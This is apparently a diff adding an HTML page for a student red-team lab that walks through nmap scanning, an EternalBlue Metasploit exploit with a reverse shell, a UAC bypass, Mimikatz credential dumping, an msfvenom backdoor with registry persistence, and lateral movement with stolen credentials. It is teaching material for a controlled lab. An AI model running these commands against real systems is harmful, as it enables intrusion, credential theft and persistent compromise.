@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Project 10: Red Team Simulation | Proftsec</title>
+<meta name="keywords" content="Red Team, Offensive Security, Penetration Testing, Ethical Hacking">
+<meta name="description" content="Simulate real-world cyberattacks, exploit vulnerabilities, and practice adversarial tactics in a controlled environment.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/projects/advanced-securitypenetration-testing/red-team-simulation/lab/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.9de45e225101e4f99701d2b68fc6b8a1ef6027928be6391fa15bf7f56326c909.css" integrity="sha256-neReIlEB5PmXAdK2j8a4oe9gJ5KL5jkfoVv39WMmyQk=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+
+
+<script>
+    fetch('/.netlify/functions/get-ga-id')
+        .then(response => {
+            if (!response.ok) {
+                throw new Error(`HTTP error! Status: ${response.status}`);
+            }
+            return response.text();
+        })
+        .then(id => {
+            if (!id || id === "No GA ID found") {
+                console.warn("GA4 ID not found. Ensure your Netlify environment variable is set.");
+                return;
+            }
+
+            window.dataLayer = window.dataLayer || [];
+            function gtag(){dataLayer.push(arguments);}
+            gtag('js', new Date());
+
+            gtag('config', id);
+        })
+        .catch(error => console.error("Error loading GA4 ID:", error));
+</script>
+
+<link rel="alternate" hreflang="en" href="http://localhost:1313/projects/advanced-securitypenetration-testing/red-team-simulation/lab/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Proftsec (Alt + H)">
+                    <img src="http://localhost:1313/images/logo.webp" alt="" aria-label="logo"
+                        height="40">Proftsec</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/about/">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/blog/">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/podcasts/">
+                    <span>Podcasts</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Project 10: Red Team Simulation
+    </h1>
+    <div class="post-description">
+      Simulate real-world cyberattacks, exploit vulnerabilities, and practice adversarial tactics in a controlled environment.
+    </div>
+    <div class="post-meta"><span title='2025-03-08 00:00:00 +0000 UTC'>March 8, 2025</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="red-team-simulation">Red Team Simulation<a hidden class="anchor" aria-hidden="true" href="#red-team-simulation">#</a></h1>
+<h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>This lab immerses students in <strong>offensive cybersecurity operations</strong> by simulating real-world cyberattacks. Participants will <strong>emulate adversaries</strong>, exploit vulnerabilities, establish persistence, and escalate privileges—all while <strong>avoiding detection</strong>.</p>
+<h2 id="what-you-will-learn">What You Will Learn<a hidden class="anchor" aria-hidden="true" href="#what-you-will-learn">#</a></h2>
+<ul>
+<li><strong>Attack simulation &amp; adversarial tactics</strong></li>
+<li><strong>Privilege escalation &amp; persistence techniques</strong></li>
+<li><strong>Exploiting misconfigurations &amp; security flaws</strong></li>
+<li><strong>Bypassing endpoint security &amp; evading detection</strong></li>
+<li><strong>Using offensive security tools for post-exploitation</strong></li>
+</ul>
+<hr>
+<h2 id="lab-instructions">Lab Instructions<a hidden class="anchor" aria-hidden="true" href="#lab-instructions">#</a></h2>
+<h3 id="1-setting-up-your-environment"><strong>1. Setting Up Your Environment</strong><a hidden class="anchor" aria-hidden="true" href="#1-setting-up-your-environment">#</a></h3>
+<p>You will need:</p>
+<ul>
+<li><strong>Kali Linux VM</strong> (VirtualBox, Proxmox, or AWS)</li>
+<li><strong>A vulnerable machine</strong> (TryHackMe, Metasploitable, or Windows 10 test VM)</li>
+<li><strong>Offensive security tools</strong>: Metasploit, Cobalt Strike (trial or Sliver), Mimikatz, PowerShell Empire</li>
+</ul>
+<hr>
+<h3 id="2-initial-reconnaissance--scanning"><strong>2. Initial Reconnaissance &amp; Scanning</strong><a hidden class="anchor" aria-hidden="true" href="#2-initial-reconnaissance--scanning">#</a></h3>
+<p>Gather intelligence on the target system.</p>
+<h4 id="step-1-perform-network-discovery-with-nmap"><strong>Step 1: Perform Network Discovery with Nmap</strong><a hidden class="anchor" aria-hidden="true" href="#step-1-perform-network-discovery-with-nmap">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -A -p- &lt;target-IP&gt;
+</span></span></code></pre></div><p>📌 <strong>What this does:</strong> Scans all ports, detects services, and runs basic vulnerability scripts.</p>
+<h4 id="step-2-identify-open-smb--rdp-services"><strong>Step 2: Identify Open SMB &amp; RDP Services</strong><a hidden class="anchor" aria-hidden="true" href="#step-2-identify-open-smb--rdp-services">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap --script smb-enum-shares,smb-os-discovery -p 139,445 &lt;target-IP&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">3389</span> --script rdp-vuln-ms12-020 &lt;target-IP&gt;
+</span></span></code></pre></div><p>📌 <strong>What this does:</strong> Finds exploitable SMB and RDP services.</p>
+<hr>
+<h3 id="3-gaining-initial-access"><strong>3. Gaining Initial Access</strong><a hidden class="anchor" aria-hidden="true" href="#3-gaining-initial-access">#</a></h3>
+<h4 id="step-1-exploit-smb-using-metasploit"><strong>Step 1: Exploit SMB Using Metasploit</strong><a hidden class="anchor" aria-hidden="true" href="#step-1-exploit-smb-using-metasploit">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole
+</span></span><span style="display:flex;"><span>use exploit/windows/smb/ms17_010_eternalblue
+</span></span><span style="display:flex;"><span>set RHOSTS &lt;target-IP&gt;
+</span></span><span style="display:flex;"><span>set PAYLOAD windows/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>set LHOST &lt;your-IP&gt;
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><p>📌 <strong>What this does:</strong> Uses the EternalBlue exploit to gain a Meterpreter shell.</p>
+<hr>
+<h3 id="4-privilege-escalation"><strong>4. Privilege Escalation</strong><a hidden class="anchor" aria-hidden="true" href="#4-privilege-escalation">#</a></h3>
+<p>Once inside the system, escalate privileges to <strong>Administrator</strong> or <strong>SYSTEM</strong>.</p>
+<h4 id="step-1-use-local-exploits"><strong>Step 1: Use Local Exploits</strong><a hidden class="anchor" aria-hidden="true" href="#step-1-use-local-exploits">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use exploit/windows/local/bypassuac
+</span></span><span style="display:flex;"><span>set SESSION <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>set PAYLOAD windows/x64/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><p>📌 <strong>What this does:</strong> Bypasses UAC to escalate privileges.</p>
+<h4 id="step-2-dump-credentials-with-mimikatz"><strong>Step 2: Dump Credentials with Mimikatz</strong><a hidden class="anchor" aria-hidden="true" href="#step-2-dump-credentials-with-mimikatz">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>load mimikatz
+</span></span><span style="display:flex;"><span>mimikatz_command -f sekurlsa::logonpasswords
+</span></span></code></pre></div><p>📌 <strong>What this does:</strong> Extracts plaintext credentials from memory.</p>
+<hr>
+<h3 id="5-establishing-persistence"><strong>5. Establishing Persistence</strong><a hidden class="anchor" aria-hidden="true" href="#5-establishing-persistence">#</a></h3>
+<h4 id="step-1-create-a-reverse-shell-backdoor"><strong>Step 1: Create a Reverse Shell Backdoor</strong><a hidden class="anchor" aria-hidden="true" href="#step-1-create-a-reverse-shell-backdoor">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>&lt;your-IP&gt; LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f exe &gt; backdoor.exe
+</span></span></code></pre></div><p>📌 <strong>What this does:</strong> Generates a persistent backdoor.</p>
+<h4 id="step-2-add-to-windows-startup"><strong>Step 2: Add to Windows Startup</strong><a hidden class="anchor" aria-hidden="true" href="#step-2-add-to-windows-startup">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>reg add HKCU<span style="color:#ae81ff">\S</span>oftware<span style="color:#ae81ff">\M</span>icrosoft<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\C</span>urrentVersion<span style="color:#ae81ff">\R</span>un /v Backdoor /t REG_SZ /d <span style="color:#e6db74">&#34;C:\\Users\\Public\\backdoor.exe&#34;</span>
+</span></span></code></pre></div><p>📌 <strong>What this does:</strong> Ensures the payload runs on every reboot.</p>
+<hr>
+<h3 id="6-lateral-movement--pivoting"><strong>6. Lateral Movement &amp; Pivoting</strong><a hidden class="anchor" aria-hidden="true" href="#6-lateral-movement--pivoting">#</a></h3>
+<h4 id="step-1-scan-for-other-network-hosts"><strong>Step 1: Scan for Other Network Hosts</strong><a hidden class="anchor" aria-hidden="true" href="#step-1-scan-for-other-network-hosts">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>run autoroute -s 192.168.1.0/24
+</span></span></code></pre></div><p>📌 <strong>What this does:</strong> Adds a route to pivot deeper into the network.</p>
+<h4 id="step-2-exploit-another-machine-using-credentials"><strong>Step 2: Exploit Another Machine Using Credentials</strong><a hidden class="anchor" aria-hidden="true" href="#step-2-exploit-another-machine-using-credentials">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use auxiliary/scanner/smb/smb_login
+</span></span><span style="display:flex;"><span>set RHOSTS 192.168.1.10
+</span></span><span style="display:flex;"><span>set SMBUser administrator
+</span></span><span style="display:flex;"><span>set SMBPass &lt;password&gt;
+</span></span><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><p>📌 <strong>What this does:</strong> Uses stolen credentials for lateral movement.</p>
+<hr>
+<h2 id="final-submission"><strong>Final Submission</strong><a hidden class="anchor" aria-hidden="true" href="#final-submission">#</a></h2>
+<ul>
+<li>Submit a <strong>Google Doc</strong> with screenshots of your completed tasks.</li>
+<li>Ensure each screenshot has a <strong>caption</strong> explaining what was accomplished.</li>
+<li>Follow submission guidelines as provided by your instructor.</li>
+</ul>
+<p>🚀 <strong>Congratulations! You&rsquo;ve completed the Red Team Simulation!</strong> 🚀</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/red-team/">Red Team</a></li>
+      <li><a href="http://localhost:1313/tags/offensive-security/">Offensive Security</a></li>
+      <li><a href="http://localhost:1313/tags/penetration-testing/">Penetration Testing</a></li>
+      <li><a href="http://localhost:1313/tags/ethical-hacking/">Ethical Hacking</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">Proftsec</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+
+</body>
+
+</html>
